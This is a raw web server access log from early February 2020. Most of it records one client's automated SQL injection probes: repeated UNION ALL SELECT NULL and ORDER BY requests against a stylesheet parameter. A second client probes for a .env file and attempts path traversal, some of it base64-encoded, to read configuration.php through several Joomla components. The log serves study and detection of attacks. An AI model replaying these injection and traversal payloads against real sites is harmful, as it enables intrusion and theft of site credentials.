77.75.76.171 - - [02/Feb/2020:21:01:58 +0100] "GET /robots.txt HTTP/1.1" 200 120
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20BIDy HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20kaRO HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20ORDER%20BY%201231--%20SLPW HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:47 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20GhJW HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20gocT HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20naVz HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Nnjm HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%29%20ORDER%20BY%201%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:48 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20ORDER%20BY%202943%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20ORDER%20BY%201%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:49 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20ORDER%20BY%201%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:50 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20ORDER%20BY%203664%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20ORDER%20BY%205213%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20ORDER%20BY%201%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20ORDER%20BY%201%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20ORDER%20BY%201847%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:51 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:52 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:53 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:53 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:53 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:53 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:53 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:54 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:54 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:54 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:54 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:54 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:55 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
45.227.253.62 - - [02/Feb/2020:22:15:55 +0100] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 908
54.36.149.34 - - [02/Feb/2020:22:45:54 +0100] "GET /segelkurs-jollesmartkat.shtml HTTP/1.1" 200 5349
138.68.49.181 - - [02/Feb/2020:23:04:40 +0100] "GET /.env HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:04:44 +0100] "GET /.env HTTP/1.1" 404 5173
138.68.49.181 - - [02/Feb/2020:23:04:52 +0100] "GET /index.php?option=com_download-monitor&file=configuration.php HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:04:59 +0100] "GET / HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:05:02 +0100] "GET /index.php?option=com_download-monitor&file=configuration.php HTTP/1.1" 302 0
138.68.49.181 - - [02/Feb/2020:23:05:03 +0100] "GET / HTTP/1.1" 200 7743
138.68.49.181 - - [02/Feb/2020:23:05:05 +0100] "GET /components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:05:10 +0100] "GET /components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php HTTP/1.1" 404 5177
138.68.49.181 - - [02/Feb/2020:23:05:21 +0100] "GET /index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php HTTP/1.1" 500 0
138.68.49.181 - - [02/Feb/2020:23:05:28 +0100] "GET /modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA== HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:05:32 +0100] "GET /modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA== HTTP/1.1" 404 5172
138.68.49.181 - - [02/Feb/2020:23:05:39 +0100] "GET /components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA== HTTP/1.1" 301 705
138.68.49.181 - - [02/Feb/2020:23:05:47 +0100] "GET /components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA== HTTP/1.1" 404 5178
40.77.167.91 - - [02/Feb/2020:23:50:03 +0100] "GET / HTTP/1.1" 200 7743
